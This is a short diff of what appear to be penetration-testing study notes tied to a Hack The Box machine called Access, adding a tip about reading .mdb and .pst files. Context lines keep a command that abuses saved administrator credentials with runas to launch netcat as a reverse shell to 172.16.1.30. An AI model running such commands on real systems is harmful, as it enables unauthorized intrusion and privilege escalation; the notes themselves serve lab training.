@@ -16,9 +16,11 @@ runas /env /noprofile /savecred /user:username\administrator "cmd.exe /c whoami 
 runas /env /noprofile /savecred /user:username\administrator "c:\temp\nc.exe 172.16.1.30 443 -e cmd.exe"
 ```
 
+
+- We can use `mdb-sql` and `readpst` tools to open and read `.mdb` and `.pst` files
+
+
 See HTB [[Access]]
-
-
 # Enumeration
 
 - Nmap
